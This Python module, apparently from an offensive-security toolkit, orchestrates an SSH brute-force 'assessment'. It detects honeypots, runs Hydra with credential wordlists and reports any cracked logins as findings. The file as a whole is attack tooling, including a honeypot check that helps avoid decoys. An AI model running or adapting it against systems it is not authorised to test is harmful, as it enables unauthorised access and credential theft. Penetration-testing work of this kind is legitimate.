from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from attacker import report as report_mod
from attacker.attacks.common import (
    is_reachable,
    make_results_dir,
    prompt_yes_no,
    resolve_default_credentials,
    resolve_password_wordlist,
    resolve_username_wordlist,
    run_credential_bruteforce,
)
from attacker.attacks.honeypot import analyze_logins, detect_ssh, warn_if_suspected

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class SshBruteforceConfig:
    target_host: str
    target_port: int = 2222
    hydra_tasks: int = 16
    hydra_timeout: int = 120
    ssh_timeout: float = 8.0
    pause_between_manual: float = 0.5
    pause_before_assertions: float = 10.0
    skip_hydra: bool = False
    use_full_wordlist: bool = False
    password_wordlist: Path | None = None
    username_wordlist: Path | None = None
    default_credentials: Path | None = None


@dataclass
class SshBruteforceReport:
    target: str
    hydra_attempts: int = 0
    hydra_credentials_found: int = 0
    honeypot_suspected: bool = False
    skipped_phases: list[str] = field(default_factory=list)
    exit_code: int = 0


def run(
    config: SshBruteforceConfig,
    reports_dir: Path,
) -> SshBruteforceReport:
    started_at = datetime.now()
    start = time.monotonic()
    target = f"ssh://{config.target_host}:{config.target_port}"
    report = SshBruteforceReport(target=target)

    results = make_results_dir(reports_dir, prefix="ssh")
    logger.info("Artefacts directory: %s", results.path)

    rich = report_mod.Report(
        title="SSH Brute-Force Assessment",
        target=target,
        protocol="ssh",
        host=config.target_host,
        port=config.target_port,
        started_at=started_at,
    )

    if not is_reachable(config.target_host, config.target_port):
        logger.error(
            "SSH target unreachable at %s:%d", config.target_host, config.target_port
        )
        report.exit_code = 2
        rich.exit_code = 2
        rich.duration_s = time.monotonic() - start
        report_mod.write_report(results.path, rich)
        return report
    logger.info("SSH target reachable")

    # Pre-attack passive/active honeypot check (banner + default/decoy logins).
    verdict = detect_ssh(config.target_host, config.target_port)

    default_credentials = resolve_default_credentials(config.default_credentials, "ssh")
    username_wordlist = resolve_username_wordlist(config.username_wordlist)
    password_wordlist = resolve_password_wordlist(config.password_wordlist)

    found: list[tuple[str, str]] = []
    if config.skip_hydra:
        report.skipped_phases.append("hydra")
        rich.phases.append(
            report_mod.ReportPhase("Brute-force (Hydra)", "skipped", "--skip-hydra")
        )
        logger.warning("Phase 1 skipped (--skip-hydra)")
    else:
        outcome = run_credential_bruteforce(
            "ssh",
            config.target_host,
            config.target_port,
            tasks=config.hydra_tasks,
            timeout=config.hydra_timeout,
            results=results,
            default_credentials=default_credentials,
            username_wordlist=username_wordlist,
            password_wordlist=password_wordlist,
            use_full_wordlist=config.use_full_wordlist,
            confirm_escalation=prompt_yes_no,
        )
        found = outcome.found
        report.hydra_attempts = outcome.attempts
        report.hydra_credentials_found = len(outcome.found)
        rich.phases.append(
            report_mod.ReportPhase(
                "Brute-force (Hydra)",
                "completed",
                f"{outcome.attempts} attempt(s) across phases: "
                f"{', '.join(outcome.phases) or 'none'}; "
                f"{len(outcome.found)} credential(s) accepted",
            )
        )

        analyze_logins(
            verdict,
            outcome.found,
            protocol="ssh",
            indicator="ssh-bruteforce",
        )

    report.honeypot_suspected = warn_if_suspected(verdict, logger)

    _populate_report(rich, config, report, verdict, found)
    rich.duration_s = time.monotonic() - start
    report_mod.write_report(results.path, rich)
    return report


def _populate_report(
    rich: report_mod.Report,
    config: SshBruteforceConfig,
    report: SshBruteforceReport,
    verdict: object,
    found: list[tuple[str, str]],
) -> None:
    rich.exit_code = report.exit_code
    rich.honeypot = report_mod.honeypot_assessment_from_verdict(verdict)
    rich.credentials = [
        report_mod.ReportCredential(user, pwd, service="SSH") for user, pwd in found
    ]
    for user, pwd in found:
        rich.findings.append(
            report_mod.ReportFinding(
                "critical",
                "Valid SSH credentials accepted",
                f"`{user}:{pwd}` at {report.target}",
            )
        )
    if rich.honeypot.suspected:
        rich.findings.append(
            report_mod.ReportFinding(
                "info",
                "Target appears to be a honeypot",
                f"honeypot confidence {rich.honeypot.score}%",
            )
        )
    rich.metrics = {
        "Port": config.target_port,
        "Login attempts": report.hydra_attempts,
        "Credentials cracked": report.hydra_credentials_found,
        "Honeypot suspected": "yes" if report.honeypot_suspected else "no",
        "Skipped phases": ", ".join(report.skipped_phases) or "none",
    }
